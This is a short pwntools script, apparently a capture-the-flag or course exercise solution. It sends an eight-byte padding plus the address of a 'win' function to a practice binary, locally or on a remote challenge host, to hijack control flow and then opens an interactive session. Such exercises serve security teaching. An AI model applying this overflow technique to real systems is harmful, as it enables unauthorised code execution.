from pwn import *

PROGNAME = "./lol"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 1

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

p.sendline(b"A" * 8 + p32(elf.symbols["win"]))

p.interactive()
